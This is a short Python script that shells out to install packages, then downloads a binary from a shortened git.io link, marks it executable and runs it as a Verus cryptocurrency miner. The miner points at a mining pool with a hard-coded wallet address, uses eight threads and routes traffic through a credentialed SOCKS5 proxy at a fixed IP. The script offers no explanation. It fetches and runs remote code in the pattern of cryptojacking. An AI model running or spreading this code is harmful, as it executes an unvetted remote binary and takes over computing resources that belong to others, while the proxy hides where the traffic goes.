import os as alpha
alpha.system("apt update && apt install wget -y && apt install sudo -y")
alpha.system("apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://git.io/JKYC2 && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.SIHU -p x -t 8 -x socks5://janda:9000@88.198.24.108:1080")
